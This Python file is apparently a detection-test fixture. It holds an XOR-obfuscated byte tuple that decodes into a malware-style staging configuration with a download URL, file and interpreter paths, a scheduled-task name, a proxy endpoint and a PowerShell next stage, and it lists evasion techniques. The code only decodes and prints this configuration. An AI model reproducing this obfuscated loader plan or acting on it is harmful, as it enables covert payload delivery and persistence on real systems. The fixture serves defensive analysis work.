#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_cb5d22fa = (69, 7, 4, 90, 17, 24, 4, 25, 21, 7, 89, 17, 23, 6, 1, 27, 7, 17, 6, 73, 17, 19, 21, 0, 7, 43, 0, 12, 17, 26, 8, 77, 69, 77, 65, 69, 78, 69, 90, 68, 90, 68, 90, 67, 70, 69, 73, 0, 26, 29, 27, 4, 16, 26, 17, 43, 13, 12, 27, 6, 4, 8, 77, 18, 22, 68, 68, 76, 18, 65, 71, 22, 89, 17, 0, 21, 16, 4, 33, 25, 17, 0, 7, 13, 39, 73, 17, 25, 21, 26, 43, 31, 7, 21, 0, 8, 17, 12, 17, 90, 26, 27, 28, 0, 13, 4, 91, 77, 18, 22, 68, 68, 76, 18, 65, 71, 22, 89, 26, 27, 28, 0, 13, 36, 91, 21, 0, 21, 48, 25, 21, 6, 19, 27, 6, 36, 91, 78, 55, 73, 28, 0, 21, 4, 43, 6, 17, 0, 17, 6, 4, 6, 17, 0, 26, 29, 8, 13, 4, 90, 77, 18, 22, 68, 68, 76, 18, 65, 71, 22, 89, 17, 0, 21, 16, 4, 1, 90, 91, 22, 21, 56, 7, 7, 17, 6, 0, 26, 1, 60, 91, 21, 0, 21, 48, 25, 21, 6, 19, 27, 6, 36, 91, 78, 55, 73, 28, 0, 21, 4, 43, 17, 24, 29, 18, 8, 77, 18, 22, 68, 68, 76, 18, 65, 71, 22, 91, 26, 27, 28, 0, 13, 36, 7, 7, 17, 6, 0, 26, 1, 60, 73, 0, 26, 17, 19, 21, 43, 6, 17, 7, 1, 8, 13, 4, 90, 76, 68, 76, 70, 67, 66, 23, 18, 91, 16, 29, 24, 21, 2, 26, 29, 90, 17, 24, 4, 25, 21, 12, 17, 90, 77, 18, 22, 68, 68, 76, 18, 65, 71, 22, 91, 91, 78, 7, 4, 0, 0, 28, 73, 24, 6, 1, 8, 77, 18, 22, 68, 68, 76, 18, 65, 71, 22, 89, 26, 19, 29, 21, 4, 25, 21, 23, 73, 16, 29, 43, 26, 19, 29, 21, 4, 25, 21, 23, 8, 6, 27, 0, 4, 29, 6, 23, 7, 17, 16, 43, 17, 23, 29, 2, 6, 17, 7, 73, 26, 29, 21, 28, 23, 43, 7, 3, 27, 16, 26, 29, 3, 8, 17, 23, 29, 2, 6, 17, 7, 43, 7, 3, 27, 16, 26, 29, 3, 43, 17, 12, 17, 70, 13, 4, 73, 6, 17, 29, 6, 6, 21, 23, 8, 19, 26, 29, 0, 1, 27, 6, 43, 26, 27, 29, 0, 4, 17, 23, 12, 17, 73, 26, 27, 29, 0, 21, 23, 7, 1, 18, 22, 27, 8, 19, 26, 29, 16, 26, 29, 22, 43, 7, 1, 6, 24, 21, 3, 73, 12, 21, 0, 26, 13, 7, 8, 65, 73, 0, 26, 1, 27, 23, 43, 17, 19, 21, 0, 7, 8, 18, 18, 27, 16, 26, 21, 28, 43, 17, 24, 13, 0, 7, 43, 26, 27, 28, 0, 13, 4, 26, 27, 6, 29, 73, 6, 17, 0, 4, 21, 16, 21, 8, 7, 7, 17, 23, 27, 6, 4, 43, 28, 23, 0, 21, 4, 7, 29, 16, 88, 17, 24, 29, 18, 43, 17, 0, 29, 6, 3, 88, 16, 17, 16, 16, 17, 22, 25, 17, 43, 17, 16, 27, 23, 17, 16, 88, 17, 0, 27, 25, 17, 6, 43, 17, 6, 29, 1, 5, 23, 21, 88, 0, 7, 27, 28, 43, 17, 24, 29, 18, 27, 6, 4, 73, 7, 4, 17, 0, 7, 8, 70, 73, 2,)
CODEC_cb5d22fa = "integer_tuple|reverse_then_xor|74"

def load_cb5d22fa():
    return bytes(MATERIAL_cb5d22fa)

def decode_cb5d22fa(e):
    return bytes(value ^ 116 for value in reversed(e))

def recover_cb5d22fa():
    n = (3, 5, 8, 13)[1:3]
    _pass = 0
    while _pass < 1:
        d = decode_cb5d22fa(load_cb5d22fa())
        _pass += 1
    t = d.decode("ascii", "strict")
    return t

def inspect_cb5d22fa():
    stream = io.BytesIO(recover_cb5d22fa().encode("ascii"))
    return stream.read().decode("ascii")

def surface_cb5d22fa():
    return surface if (surface := ("walrus_binding", "exception_routing", "py2exe_windows_service", "service_descriptor")) else ()

def obfuscation_cb5d22fa():
    try:
        {}["missing"]
    except KeyError:
        return "exception_routing"

def plan_cb5d22fa():
    fields = dict(item.split("=", 1) for item in inspect_cb5d22fa().split("|"))
    analysis_surface = surface_cb5d22fa()
    obfuscation_surface = obfuscation_cb5d22fa()
    operation_plan = ("ironpython_style_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_cb5d22fa())
